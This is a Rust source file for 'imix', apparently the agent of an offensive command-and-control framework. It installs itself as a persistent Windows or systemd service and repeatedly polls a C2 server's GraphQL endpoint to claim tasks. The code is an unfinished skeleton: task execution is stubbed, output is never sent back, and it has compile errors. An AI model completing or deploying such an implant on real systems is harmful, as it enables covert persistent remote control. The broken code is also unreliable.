extern crate imix;
extern crate eldritch;


use clap::{Command, arg};
pub use imix::graphql;
use imix::graphql::GraphQLTask;
use std::collections::HashMap;
use std::fs::File;
use std::future::Future;
use std::path::Path;
use std::pin::Pin;
use std::time::Instant;

use anyhow::Error;
use tokio::task::JoinHandle;

enum TaskStatus {
    Running,
    Finished,
}

struct Task{
    status: TaskStatus, // Wating, Running, Finished
    graphql_task: GraphQLTask,
}

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;
	
    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }
	 
	unimplemented!("The current OS/Service Manager is not supported")
}

async fn execute_task(Task: GraphQLTask) -> Result<(String, String), Error> {
    Ok(("root".to_string(), "".to_string()))
}

fn queue_task(input_task: GraphQLTask) -> Task {
    let task_execute_future = execute_task(input_task.clone());
    let res = Task{
        status: TaskStatus::Running,
        graphql_task: input_task,
    };
    res
}

#[async_recursion]
async fn main_loop(imix_config: imix::Config) -> Result<(), Error>{
    let debug = true;
    let mut active_tasks: HashMap<String,Task> = HashMap::new();
    let mut all_execute_futures: Vec<_> = vec![];
    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();

        // 1. Pull down new tasks
        let new_tasks = match graphql::gql_claim_tasks(imix_config.callback_config.c2_configs[0].uri.clone()).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                continue;
            },
        };

        // 2. Start new tasks
        for task in new_tasks {
            match active_tasks.insert(task.id.clone(), queue_task(task)) {
                Some(old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n{}", old_task.graphql_task.id)
                    }
                },
                None => {},
            }
        }
        // 3. Sleep till callback time
        //                                  time_to_wait          -         time_elapsed
        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
        tokio::time::sleep(std::time::Duration::new(time_to_sleep, 67812)).await;

        // 4. Collect task output

        // 5. Send task output 

    }
    unimplemented!("Nothing here yet. ")
}

fn run(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    unimplemented!("The current OS/Manager is not supported");

    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();

    let response = runtime.block_on(
        main_loop(config)
    );

    match response {
        Ok(_) => todo!(),
        Err(_) => todo!(),
    }

}

fn main() {
    run("/tmp/config".to_string());
}

// #[tokio::main]
// async fn main() -> Result<(), imix::Error> {
//     let matches = Command::new("imix")
//         .arg(
//             arg!(
//                 -c --config <FILE> "Sets a custom config file"
//             )
//             .required(false)
//         )
//         .subcommand(
//             Command::new("install")
//                 .about("Run in install mode")
//                 .arg(
//                     arg!(
//                         -c --config <FILE> "Sets a custom config file"
//                     )
//                     .required(true)
//                 )
//         )
//         .get_matches();
    
//     if let Some(config_path) = matches.value_of("config") {
//         return run(String::from(config_path)).await
//     }

//     match matches.subcomman {
//         Some(("install", args)) => {
//             let config_path = args.value_of("config").unwrap();
//             install(String::from(config_path)).await
//         },
//         _ => Ok(())
//     }
// }


